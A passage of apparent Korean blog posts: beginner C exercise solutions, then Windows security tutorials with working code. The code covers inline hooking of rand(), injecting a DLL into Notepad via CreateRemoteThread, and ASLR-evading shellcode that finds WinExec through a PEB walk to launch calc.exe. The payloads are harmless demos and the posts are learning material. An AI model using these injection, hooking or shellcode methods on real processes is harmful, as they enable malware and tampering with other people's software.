%d\u0026#34;, \u0026amp;A, \u0026amp;B); A = ((A % 10) * 100) + ((A % 100) / 10) * 10 + (A / 100); B = ((B % 10) * 100) + ((B % 100) / 10) * 10 + (B / 100); if (A \u0026gt; B) { printf(\u0026#34;%d\u0026#34;, A); } else { printf(\u0026#34;%d\u0026#34;, B); } return 0; } 5622 | 다이얼 문제 링크\n문제 설명 전화를 걸고 싶은 번호가 있다면, 숫자를 하나를 누른 다음에 금속 핀이 있는 곳 까지 시계방향으로 돌려야 한다. 숫자를 하나 누르면 다이얼이 처음 위치로 돌아가고, 다음 숫자를 누르려면 다이얼을 처음 위치에서 다시 돌려야 한다.\n숫자 1을 걸려면 총 2초가 필요하다. 1보다 큰 수를 거는데 걸리는 시간은 이보다 더 걸리며, 한 칸 옆에 있는 숫자를 걸기 위해선 1초씩 더 걸린다.\n상근이의 할머니는 전화 번호를 각 숫자에 해당하는 문자로 외운다. 즉, 어떤 단어를 걸 때, 각 알파벳에 해당하는 숫자를 걸면 된다. 예를 들어, UNUCIC는 868242와 같다.\n할머니가 외운 단어가 주어졌을 때, 이 전화를 걸기 위해서 필요한 최소 시간을 구하는 프로그램을 작성하시오.\n풀이 알파벳과 해당 알파벳마다의 걸리는 시간을 배열로 저장한 뒤, 반복문을 통해 입력받은 문자열의 문자와 알파벳 배열의 문자가 같을 경우, 해당 알파벳이 걸리는 시간을 dial 배열의 인덱스에서 구해 더해주었다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { char input[15]; char alph[26] = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;; int dial[26] = {3, 3, 3, 4, 4, 4, 5, 5, 5, 6, 6, 6, 7, 7, 7, 8, 8, 8, 8, 9, 9, 9, 10, 10, 10, 10}; int res = 0; scanf(\u0026#34;%s\u0026#34;, input); unsigned int len = strlen(input); for (int i = 0; i \u0026lt; len; i++) { for (int j = 0; j \u0026lt; 26; j++) { if (alph[j] == input[i]) { res += dial[j]; } } } printf(\u0026#34;%d\u0026#34;, res); return 0; } 11718 | 그대로 출력하기 문제 링크\n문제 설명 입력 받은 대로 출력하는 프로그램을 작성하시오.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;stdio.h\u0026gt; int main() { char S[100]; while (scanf(\u0026#34;%[^\\n]\u0026#34;, S) != -1) { printf(\u0026#34;%s\\n\u0026#34;, S); getchar(); } return 0; } 2440 | 별 찍기 - 3 문제 링크\n문제 설명 첫째 줄에는 별 N개, 둘째 줄에는 별 N-1개, \u0026hellip;, N번째 줄에는 별 1개를 찍는 문제\n설명 이중 반복문을 통해, i 가 N 부터 0이 될 때까지 별을 출력하고 줄바꿈하도록 하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #include \u0026lt;stdio.h\u0026gt; int main() { int N; scanf(\u0026#34;%d\u0026#34;, \u0026amp;N); for (int i = N; i \u0026gt; 0; i--) { for (int j = 1; j \u0026lt;= i; j++) { printf(\u0026#34;*\u0026#34;); } printf(\u0026#34;\\n\u0026#34;); } return 0; } 2441 | 별 찍기 - 4 문제 링크\n문제 설명 첫째 줄에는 별 N개, 둘째 줄에는 별 N-1개, \u0026hellip;, N번째 줄에는 별 1개를 찍는 문제\n하지만, 오른쪽을 기준으로 정렬한 별(예제 참고)을 출력하시오.\n풀이 N이 0이 될 때까지 N-1 만큼 공백을 출력하고 i 만큼 별을 출력한 뒤 줄바꿈하도록 하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include \u0026lt;stdio.h\u0026gt; int main() { int N; scanf(\u0026#34;%d\u0026#34;, \u0026amp;N); for (int i = N; i \u0026gt; 0; i--) { for (int j = 0; j \u0026lt; N - i; j++) { printf(\u0026#34; \u0026#34;); } for (int j = 0; j \u0026lt; i; j++) { printf(\u0026#34;*\u0026#34;); } printf(\u0026#34;\\n\u0026#34;); } return 0; } Codeup 문제 풀이 1173 | 30분전 문제 설명 수호는 30분 전으로 돌아가고 싶은 1人 이다.\n공백을 기준으로 시간과 분이 주어진다.\n그러면 이 시간을 기준으로 30분전의 시간을 출력하시오.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #include \u0026lt;stdio.h\u0026gt; int main() { int h, m; scanf(\u0026#34;%d %d\u0026#34;, \u0026amp;h, \u0026amp;m); if (m \u0026lt; 30) { if (h == 0) { h = 24; } h--; m += 60; } m -= 30; printf(\u0026#34;%d %d\u0026#34;, h, m); return 0; } 1180 | 만능 휴지통 문제 설명 민호는 발명을 되게 좋아하고, 컴퓨터 프로그램도 되게 좋아한다.\n어느 날 민호는 컴퓨터를 사용하던 중 휴지통이 꽉 차서 불편을 느꼈다.\n그래서 휴지통이 n만큼 차면 알아서 쓰레기를 압축해주는 휴지통을 만들려고 한다.\n이 때 압축하는 알고리즘은 다음과 같다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include \u0026lt;stdio.h\u0026gt; int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); n = (((n % 10) * 10 + (n / 10)) * 2) % 100; printf(\u0026#34;%d\\n\u0026#34;, n); if (n \u0026lt;= 50) { printf(\u0026#34;GOOD\u0026#34;); } else { printf(\u0026#34;OH MY GOD\u0026#34;); } return 0; } 1284 | 암호 해독 문제 설명 두 소수의 곱을 암호로 사용하는 알고리즘은 큰 수의 소인수분해가 어렵기 때문에 안전하다고 알려져있다.\n그렇지만, 만약 두 소수를 잊어버리면 어떻게 될까? 굉장히 난감할 것이다.\n이에 대비해 어떤 수(n)가 입력되면 두 소수의 곱으로 나타낼 수 있으면 두 소수를 오름차순으로 출력하고,\n그렇지 않으면 \u0026ldquo;wrong number\u0026quot;를 출력하는 프로그램을 작성하시오.\n문제 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #include \u0026lt;stdio.h\u0026gt; int main() { int n, cnt; int res[2] = {0, 0}; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for (int i = 1; i \u0026lt;= n; i++) { if (n % i == 0) { cnt = 0; for (int j = 1; j \u0026lt;= i; j++) { if (i % j == 0) { cnt++; } } if (cnt == 2) { if (res[0] != 0) { res[1] = i; } else { res[0] = i; } } } } if (res[0] * res[1] == n) { printf(\u0026#34;%d %d\u0026#34;, res[0], res[1]); } else { printf(\u0026#34;wrong number\u0026#34;); } return 0; } ","date":"2025-04-02T00:00:00Z","permalink":"https://t43w00.netlify.app/p/layer7-c%EC%96%B8%EC%96%B4-2%EC%B0%A8%EC%8B%9C/","title":"Layer7 C언어 2차시"},{"content":"codeup 문제 풀이 아래 문제 풀이와 정답 코드 정리\n1014, 1015, 1017, 1018, 1026, 1027, 1028 1029, 1030, 1031, 1032, 1033, 1034, 1035\n1014 문제 링크\n문제 설명 2개의 문자(ASCII CODE)를 입력받아서 순서를 바꿔 출력해보자.\n풀이 입력받은 변수의 순서를 바꾸어 출력해주었다.\n코드 1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;stdio.h\u0026gt; int main() { char a, b; scanf(\u0026#34;%c %c\u0026#34;, \u0026amp;a, \u0026amp;b); printf(\u0026#34;%c %c\u0026#34;, b, a); return 0; } 1015 문제 링크\n문제 설명 실수(float) 1개를 입력받아 저장한 후, 저장되어 있는 값을 소수점 셋 째 자리에서 반올림하여 소수점 이하 둘 째 자리까지 출력하시오.\n풀이 실수 값을 입력받은 뒤, %.2f 서식 지정자를 사용하여 소수점 이하 둘 째 자리까지만 출력하도록 하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;stdio.h\u0026gt; int main() { float f; scanf(\u0026#34;%f\u0026#34;, \u0026amp;f); printf(\u0026#34;%.2f\u0026#34;, f); return 0; } 1017 문제 링크\n문제 설명 int형 정수 1개를 입력받아 공백을 사이에 두고 3번 출력해보자.\n풀이 입력받은 정수를 공백을 사이에 두고 3번 출력해주었다.\n코드 1 2 3 4 5 6 7 8 9 10 #include \u0026lt;stdio.h\u0026gt; int main() { int a; scanf(\u0026#34;%d\u0026#34;, \u0026amp;a); printf(\u0026#34;%d %d %d\u0026#34;, a, a, a); return 0; } 1018 문제 링크\n문제 설명 어떤 형식에 맞추어 시간이 입력될 때, 그대로 출력하는 연습을 해보자.\n풀이 : 문자를 기준으로 앞 뒤로 정수를 입력받아 형식에 맞게 출력해주었다.\n코드 1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;stdio.h\u0026gt; int main() { int h, m; scanf(\u0026#34;%d:%d\u0026#34;, \u0026amp;h, \u0026amp;m); printf(\u0026#34;%d:%d\u0026#34;, h, m); return 0; } 1026 문제 링크\n문제 설명 입력되는 시:분:초 에서 분만 출력해보자.\n풀이 : 문자를 기준으로 시, 분, 초를 각각 h, m, s에 입력받아 m만 출력해주었다.\n코드 1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;stdio.h\u0026gt; int main() { int h, m, s; scanf(\u0026#34;%d:%d:%d\u0026#34;, \u0026amp;h, \u0026amp;m, \u0026amp;s); printf(\u0026#34;%d\u0026#34;, m); return 0; } 1027 문제 링크\n문제 설명 년월일을 출력하는 방법은 나라마다, 형식마다 조금씩 다르다.\n년월일(yyyy.mm.dd)를 입력받아,\n일월년(dd-mm-yyyy)로 출력해보자.\n(단, 한 자리 일/월은 0을 붙여 두자리로, 년도도 0을 붙여 네자리로 출력한다.)\n풀이 . 기준으로 년, 월, 일을 각각 y, m, d 변수에 입력받은 뒤, dd-mm-yyyy 형식으로 출력해주었다.\n코드 1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;stdio.h\u0026gt; int main() { int y, m, d; scanf(\u0026#34;%d.%d.%d\u0026#34;, \u0026amp;y, \u0026amp;m, \u0026amp;d); printf(\u0026#34;%02d-%02d-%04d\u0026#34;, d, m, y); return 0; } 1028 문제 링크\n문제 설명 정수 1개를 입력받아 그대로 출력해보자. (단, 입력되는 정수의 범위는 0 ~ 4,294,967,295 이다.)\n풀이 unsigned int 자료형으로 입력받아 0 ~ 4294967295 범위의 정수를 입력받아 출력하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;stdio.h\u0026gt; int main() { unsigned int a; scanf(\u0026#34;%u\u0026#34;, \u0026amp;a); printf(\u0026#34;%u\u0026#34;, a); return 0; } 1029 문제 링크\n문제 설명 실수 1개를 입력받아 그대로 출력해보자. (단, 입력되는 실수의 범위는 +- 1.710-308 ~ +- 1.710308 이다.)\n풀이 double 자료형을 입력받아 +- 3.4*10-38 ~ +- 3.4*1038 범위의 실수 값을 출력할 수 있도록 하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;stdio.h\u0026gt; int main() { double f; scanf(\u0026#34;%lf\u0026#34;, \u0026amp;f); printf(\u0026#34;%.11lf\u0026#34;, f); return 0; } 1030 문제 링크\n문제 설명 정수 1개를 입력받아 그대로 출력해보자. 단, 입력되는 정수의 범위는 -9,223,372,036,854,775,808 ~ +9,223,372,036,854,775,807 이다.\n풀이 long long int 자료형을 사용하여 범위에 맞는 값을 입출력 하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;stdio.h\u0026gt; int main() { long long int a; scanf(\u0026#34;%lld\u0026#34;, \u0026amp;a); printf(\u0026#34;%lld\u0026#34;, a); return 0; } 1031 문제 링크\n문제 설명 10진수를 입력받아 8진수(octal)로 출력해보자.\n풀이 %d 서식 지정자로 입력을 받은 뒤, 8진수를 나타내는 %o 서식 지정자로 출력하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;stdio.h\u0026gt; int main() { int a; scanf(\u0026#34;%d\u0026#34;, \u0026amp;a); printf(\u0026#34;%o\u0026#34;, a); return 0; } 1032 문제 링크\n문제 설명 10진수를 입력받아 16진수(hexadecimal)로 출력해보자.\n풀이 %d 서식 지정자로 입력을 받은 뒤, 16진수를 나타내는 %x 서식 지정자로 출력하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;stdio.h\u0026gt; int main() { int a; scanf(\u0026#34;%d\u0026#34;, \u0026amp;a); printf(\u0026#34;%x\u0026#34;, a); return 0; } 1033 문제 링크\n문제 설명 10진수를 입력받아 16진수(hexadecimal)로 출력해보자.\n풀이 %d 서식 지정자로 입력을 받은 뒤, 16진수(대문자)를 나타내는 %X 서식 지정자로 출력하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;stdio.h\u0026gt; int main() { int a; scanf(\u0026#34;%d\u0026#34;, \u0026amp;a); printf(\u0026#34;%X\u0026#34;, a); return 0; } 1034 문제 링크\n문제 설명 8진수로 입력된 정수 1개를 10진수로 바꾸어 출력해보자.\n풀이 8진수를 나타내는 %o 서식 지정자로 입력을 받은 뒤, 10진수를 나타내는 %d 서식 지정자로 출력하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;stdio.h\u0026gt; int main() { int a; scanf(\u0026#34;%o\u0026#34;, \u0026amp;a); printf(\u0026#34;%d\u0026#34;, a); return 0; } 1035 문제 링크\n문제 설명 16진수로 입력된 정수 1개를 8진수로 바꾸어 출력해보자.\n풀이 16진수를 나타내는 %x 서식 지정자로 입력을 받은 뒤, 8진수를 나타내는 %o 서식 지정자로 출력하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;stdio.h\u0026gt; int main() { int a; scanf(\u0026#34;%x\u0026#34;, \u0026amp;a); printf(\u0026#34;%o\u0026#34;, a); return 0; } C언어 환경 세팅 인증 1 2 3 4 5 6 7 8 9 ❯ gcc -v Using built-in specs. COLLECT_GCC=C:\\TDM-GCC-64\\bin\\gcc.exe COLLECT_LTO_WRAPPER=C:/TDM-GCC-64/bin/../libexec/gcc/x86_64-w64-mingw32/10.3.0/lto-wrapper.exe Target: x86_64-w64-mingw32 Configured with: ../../../src/gcc-git-10.3.0/configure --build=x86_64-w64-mingw32 --enable-targets=all --enable-languages=ada,c,c++,fortran,jit,lto,objc,obj-c++ --enable-libgomp --enable-lto --enable-graphite --enable-cxx-flags=-DWINPTHREAD_STATIC --disable-build-with-cxx --disable-build-poststage1-with-cxx --enable-libstdcxx-debug --enable-threads=posix --enable-version-specific-runtime-libs --enable-fully-dynamic-string --enable-libstdcxx-filesystem-ts=yes --disable-libstdcxx-pch --enable-libstdcxx-threads --enable-libstdcxx-time=yes --enable-mingw-wildcard --with-gnu-ld --disable-werror --enable-nls --disable-win32-registry --enable-large-address-aware --disable-rpath --disable-symvers --prefix=/mingw64tdm --with-local-prefix=/mingw64tdm --with-pkgversion=tdm64-1 --with-bugurl=https://github.com/jmeubank/tdm-gcc/issues Thread model: posix Supported LTO compression algorithms: zlib zstd gcc version 10.3.0 (tdm64-1) ","date":"2025-03-31T00:00:00Z","permalink":"https://t43w00.netlify.app/p/layer7-c%EC%96%B8%EC%96%B4-1%EC%B0%A8%EC%8B%9C/","title":"Layer7 C언어 1차시"},{"content":"목표 Inline Hooking을 통해 rand 함수의 반환값 조작하기\nInline Hooking이란? 먼저 Hooking이란, 프로그램의 실행 흐름을 변경하는 기법인데, 그 중 Inline Hooking은 특정 함수의 시작 부분에 코드를 삽입하여 흐름을 변경하는 기법이다.\nDLL 코드 작성 rand 값을 조작하는 DLL 코드를 작성한 뒤, 랜덤한 값을 출력하는 프로그램에서 로드하여 실행할 것이다.\n함수 주소 가져오기 GetModuleHandle 함수로 rand 함수를 저장하는 ucrtbase.dll의 핸들을 가져온 뒤, GetProcAddress 함수로 rand 함수의 주소를 가져올 수 있다.\n삽입할 코드 배열 생성하기 삽입할 코드는 jmp 명령어의 옵코드인 0xE9를 저장하고, 다음으로 Hooking 할 함수의 주소까지의 길이를 원래 rand 함수의 주소를 빼서 구하여 저장한다.\n메모리에 복사하기 memcpy 함수를 통해 기존 rand 함수를 저장해둔 뒤에, 후킹한 함수를 덮어씌운다.\n전체 코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 #include \u0026lt;windows.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; typedef int (*rand_Func)(void); rand_Func Original_rand = NULL; BYTE Original_bytes[5]; // 후킹할 함수 int __stdcall Hooked_rand() { return 7; } BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) { Original_rand = (rand_Func)GetProcAddress(GetModuleHandle(\u0026#34;ucrtbase.dll\u0026#34;), \u0026#34;rand\u0026#34;); BYTE Patch[5] = { 0xE9 }; *(DWORD*)(Patch + 1) = (uintptr_t)Hooked_rand - (uintptr_t)Original_rand - 5; DWORD oldProtect; // 메모리 복사하기 VirtualProtect(Original_rand, 5, PAGE_EXECUTE_READWRITE, \u0026amp;oldProtect); memcpy(Original_bytes, Original_rand, 5); memcpy(Original_rand, Patch, 5); VirtualProtect(Original_rand, 5, oldProtect, \u0026amp;oldProtect); return TRUE; } 테스트 프로그램 후킹을 테스트 할 프로그램으로 1부터 6까지 수 중에 랜덤한 값을 출력하는 C 코드를 작성한 뒤 실행하였다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;windows.h\u0026gt; int main() { HINSTANCE hDll = LoadLibrary(\u0026#34;hook.dll\u0026#34;); srand((unsigned int)time(NULL)); int random_value; for (int i = 0; i \u0026lt; 10; i++) { random_value = rand(); printf(\u0026#34;%d\\n\u0026#34;, random_value); } FreeLibrary(hDll); return 0; } 코드 실행 코드 실행 결과 랜덤 값이 7로 고정되어 출력되는 걸 확인할 수 있다.\n","date":"2025-03-10T00:00:00Z","permalink":"https://t43w00.netlify.app/p/inline-hooking/","title":"Inline Hooking"},{"content":"목표 notepad.exe에 MessageBox 함수를 호출하는 DLL Injection 하기\nDLL Injection이란? 실행 중인 프로세스의 공간에 강제로 DLL을 주입하여 악의적인 코드를 실행하는 기법을 말한다.\nDLL Injection 구현 프로세스의 메모리에 DLL 파일의 경로를 쓰고, 원격 스레드를 통해 DLL을 로드한다.\nDLL이 로드되면 DllMain 함수가 실행되는데, 이 함수에 원하는 코드를 작성하여 실행할 수 있다.\n프로세스 핸들 구하기 먼저 프로세스의 메모리에 접근하기 위해 프로세스의 핸들을 구해야 한다.\n프로세스 핸들은 OpenProcess 함수를 통해 구해야 하는데, 인자로 PID가 필요하다.\nPID 구하기 PID는 작업 관리자에서 확인할 수 있지만, 매번 확인할 수는 없으니 동적으로 구해야 한다.\ntlhelp32.h의 CreateToolhelp32Snapshot 함수를 통해 스냅샷을 만들어 프로세스의 정보를 가져올 수 있는데, PROCESSENTRY32 구조체의 필드 중 th32ProcessId를 가져올 수 있다.\n메모리 공간 할당하기 VirtualAllocEx 함수를 통해 프로세스의 메모리 공간을 할당할 수 있다.\n메모리 공간에 DLL 경로 쓰기 WriteProcessMemory 함수를 통해 지정된 프로세스의 메모리 영역에 데이터를 쓸 수 있다.\n이 함수를 통해 타겟 프로세스의 메모리 영역에 DLL의 경로를 쓰면 된다.\nLoadLibrary 함수 주소 가져오기 GetModuleHandle 함수로 kernel32.dll의 핸들을 가져오고, GetProcAddress 함수를 통해 LoadLibrary 함수의 주소를 가져올 수 있다.\n원격 스레드 생성하기 타겟 프로세스에 원격 스레드를 생성하여 DLL을 LoadLibrary 함수를 통해 불러온다.\n코드 구현 DLL Injection 코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 // compile -o DLL_Injection.exe DLL_Injection.c #include \u0026lt;windows.h\u0026gt; #include \u0026lt;tlhelp32.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(void) { HANDLE hSnapshot; HANDLE hProcess; PROCESSENTRY32 PE32; unsigned long targetPID; char* dllPath = \u0026#34;C:/Users/t43w00/MessageBox.dll\u0026#34;; // PID 구하기 PE32.dwSize = sizeof(PROCESSENTRY32); hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (Process32First(hSnapshot, \u0026amp;PE32)) { while (Process32Next(hSnapshot, \u0026amp;PE32)) { if (!strcmp(PE32.szExeFile, \u0026#34;Notepad.exe\u0026#34;)) { targetPID = PE32.th32ProcessID; break; } } } // 프로세스 핸들 구하기 hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID); printf(\u0026#34;Process Name : %s\\n\u0026#34;, PE32.szExeFile); printf(\u0026#34;Process ID : %lu\\n\u0026#34;, targetPID); printf(\u0026#34;Process Handle : %p\\n\u0026#34;, hProcess); // 메모리 공간 할당하기 LPVOID pRemoteDllPath = VirtualAllocEx( hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ); // 메모리 공간에 DLL 경로 쓰기 WriteProcessMemory( hProcess, pRemoteDllPath, dllPath, strlen(dllPath) + 1, NULL ); // LoadLibrary 함수 주소 가져오기 HMODULE hKernel32 = GetModuleHandle(\u0026#34;kernel32.dll\u0026#34;); FARPROC pLoadLibrary = GetProcAddress(hKernel32, \u0026#34;LoadLibraryA\u0026#34;); // 원격 스레드 생성하기 HANDLE hRemoteThread = CreateRemoteThread( hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteDllPath, 0, NULL ); WaitForSingleObject(hRemoteThread, INFINITE); // 정리 VirtualFreeEx( hProcess, pRemoteDllPath, 0, MEM_RELEASE ); CloseHandle(hSnapshot); CloseHandle(hProcess); return 0; } DLL 코드 DLL이 프로세스에 로드되었을 때 DllMain 함수에서 MessageBoxA 함수가 실행되도록 작성하였다.\n1 2 3 4 5 6 7 8 #include \u0026lt;windows.h\u0026gt; BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) { if (fdwReason == DLL_PROCESS_ATTACH) { MessageBoxA(NULL, \u0026#34;Injected!\u0026#34;, \u0026#34;MessageBox\u0026#34;, MB_OK); } return TRUE; } 코드 실행 notepad.exe를 실행한 뒤에, DLL_Injection.exe를 실행하면 MessageBox가 호출되는 것을 확인할 수 있다.\n","date":"2025-03-07T00:00:00Z","permalink":"https://t43w00.netlify.app/p/dll-injection/","title":"DLL Injection"},{"content":"목표 Windows 32비트 유니버셜 쉘코드 개념 이해와 제작 및 실행 유니버셜 쉘코드란? 먼저 쉘코드는 취약점을 이용하여 특정 명령을 실행하기 위한 기계어 코드를 말한다.\n하지만 ASLR 기법의 등장으로 인해 이를 우회할 필요가 있었다.\n이러한 배경으로 동적으로 함수의 주소를 가져와 실행하는 유니버셜 쉘코드가 탄생하였다.\nASLR 기법이란?\n스택, 힙, 라이브러리, 등의 주소를 랜덤한 영역에 배치하여, 주소를 예측하기 어렵게 하는 기법\n함수 주소 동적으로 구하기 ASLR 기법을 우회하기 위해 함수의 주소를 동적으로 구해야 한다.\n함수의 주소는 DLL의 PE 헤더를 파싱하여 Export Table을 통해 함수의 오프셋을 찾을 수 있다.\n그렇기 때문에 먼저 DLL의 베이스 주소를 구해야 한다.\nDLL Base Address 구하기 이번 글에서는 계산기를 실행하는 것이 목표이기 때문에 프로그램을 실행시키는 WinExec 함수가 저장되어 있는 kernel32.dll의 주소를 구하도록 하겠다.\nPEB 먼저 Windows 운영체제에서 각 프로세스의 정보를 담고 있는 PEB(Process Environment Block) 구조체에 접근해야 한다.\nPEB 구조체는 fs 레지스터의 0x30 오프셋에 위치한다.\nLDR 다음으로 프로세스에 로드된 모듈(DLL)에 대한 정보를 포함하는 PEB_LDR_DATA 구조체의 포인터인 Ldr에 접근해야 한다.\nLdr은 PEB 구조체의 0x0C 오프셋에 위치한다.\nModuleList PEB_LDR_DATA 구조체에는 모듈의 정보를 저장하는 3개의 연결 리스트가 있는데, 각각 정렬되는 방식이 다르다.\nInLoadOrderModuleList : 메모리에 로드된 순서대로 정렬 InMemoryOrderModuleList : 메모리 상에 배치된 주소 순서대로 정렬 InInitializationOrderModuleList : 초기화된 순서대로 정렬 DllBase 보통의 경우에는 메모리에 배치되는 순서가 Process Image -\u0026gt; ntdll.dll -\u0026gt; kernel32.dll 이기 때문에 InMemoryOrderModuleList의 세 번째 모듈이 kernel32.dll에 해당한다.\nwindbg를 통해 직접 확인해볼 수 있다.\nExport Table RVA 구하기 kernel32.dll의 주소를 구했으니 이제 프로그램에서 내보낸 함수의 목록이 저장된 Export Table을 찾아야 한다.\nExport Table의 위치는 Data Directory에 저장된 Export Table의 RVA를 통해 구할 수 있다.\nNT Header 먼저 PE 파일의 로딩 정보를 저장하는 NT Header에 접근해야 한다.\nNT Header의 위치는 e_lfanew에 저장되어 있는 오프셋을 통해 구할 수 있는데, 이는 DllBase(DOS Header)의 0x3C 오프셋에 저장되어 있다.\nOptional Header 다음으로 프로그램 실행에 필요한 정보를 담고 있는 Optional Header에 접근해야 한다.\nOptional Header는 NT Header의 0x18 오프셋에 위치한다.\nData Directory 이제 Export Table의 RVA가 저장되어 있는 Data Directory에 접근해야 한다.\nData Directory는 Optional Header의 0x60 오프셋에 위치한다.\nExport Table RVA Export Table의 RVA는 Data Directory 배열의 첫번째 항목이다.\nWinExec 함수 RVA 구하기 이제 Export Table의 필드들을 순회하며 필요한 값들을 이용하여 WinExec 함수의 RVA를 구해야 한다.\nExport Table Fields Export Table은 함수의 이름과 주소를 저장한 RVA를 포함하는데, 아래 필드들을 이용할 것이다.\nAddressOfFunctions : 함수들의 주소 배열의 RVA (오프셋 : 0x1C) AddressOfNames : 함수 이름들의 RVA 배열의 RVA (오프셋 : 0x20) AddressOfNameOrdinals : 이름과 함수 주소를 매핑하는 Ordinals 배열의 RVA (오프셋 : 0x24) 구하는 방법 AddressOfNames 필드에 접근하여 WinExec라는 이름의 함수의 인덱스를 기억한 뒤에,\nAddressOfNameOrdinals 배열에 접근해서 인덱스번째의 Ordinal 값을 저장하면,\nAddressOfFunctions 배열의 Ordinal 번째의 값이 WinExec 함수의 RVA 값이 될 것이다.\n따라서 WinExec 함수의 RVA 값을 kernel32.dll의 DllBase에 더하면 WinExec의 절대 주소가 된다.\n쉘코드 구현 위 정보들을 바탕으로 C언어로 쉘코드를 작성하여 컴파일한 뒤 추출하여 쉘코드로써 실행해보도록 하겠다.\nC 코드 작성 Inline Assembly를 이용하면 fs 레지스터를 통해 PEB에 접근할 수 있다.\n앞서 설명한 방법들을 통해 Export Table의 필드들을 순회하여 WinExec 함수의 주소를 구하였다.\n\u0026quot;WinExec\u0026quot;나 \u0026quot;calc.exe\u0026quot;와 같은 문자열 리터럴 값은 이후 쉘코드로 추출하였을 때 그 배열을 절대주소로 불러오기 때문에, 이를 방지하기 위해 ASCII 값으로 저장하였다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 // compile : gcc -o shellcode.exe shellcode.c -m32 #include \u0026lt;windows.h\u0026gt; int main() { // kernel32.dll Base 주소 구하기 char *PEB; __asm__ (\u0026#34;movl %%fs:0x30, %0\u0026#34; : \u0026#34;=r\u0026#34; (PEB)); // Inline Assembly(gcc)를 사용해 fs 레지스터에 접근 char *Ldr = (char *)*(int *)(PEB + 0x0C); char *InMemoryOrderModuleList = (char *)*(int *)(Ldr + 0x14); char *ntdll = (char *)*(int *)(InMemoryOrderModuleList + 0x00); char *kernel32 = (char *)*(int *)(ntdll + 0x00); char *DllBase = (char *)*(int *)(kernel32 + 0x10); // Export Table 주소 구하기 int e_lfanew = *(int *)(DllBase + 0x3C); char *NT_Header = (char *)(DllBase + e_lfanew); char *Optional_Header = (char *)(NT_Header + 0x18); char *Data_Directory = (char *)(Optional_Header + 0x60); int Export_Table_RVA = *(int *)(Data_Directory + 0x00); char *Export_Table_Addr = (char *)(DllBase + Export_Table_RVA); // Export Table Fields 주소 구하기 char *AddressOfFunctions = (char *)(DllBase + *(int *)(Export_Table_Addr + 0x1C)); char *AddressOfNames = (char *)(DllBase + *(int *)(Export_Table_Addr + 0x20)); char *AddressOfNameOrdinals = (char *)(DllBase + *(int *)(Export_Table_Addr + 0x24)); int i = 0; char WinExec_Name[] = {0x57, 0x69, 0x6E, 0x45, 0x78, 0x65, 0x63, 0x00}; while (1) { // 순회하며 WinExec 함수 찾기 char *Func_Name = (char *)*(int *)(AddressOfNames + i * sizeof(int)) + (int)DllBase; if (Func_Name[0] == WinExec_Name[0] \u0026amp;\u0026amp; Func_Name[1] == WinExec_Name[1] \u0026amp;\u0026amp; Func_Name[2] == WinExec_Name[2] \u0026amp;\u0026amp; Func_Name[3] == WinExec_Name[3] \u0026amp;\u0026amp; Func_Name[4] == WinExec_Name[4] \u0026amp;\u0026amp; Func_Name[5] == WinExec_Name[5] \u0026amp;\u0026amp; Func_Name[6] == WinExec_Name[6]) { break; } i++; } int WinExec_index = i; // Export Table Fields 구하기 short ordinal = *(short*)(AddressOfNameOrdinals + WinExec_index * sizeof(short)); int WinExec_RVA = *(int*)(AddressOfFunctions + 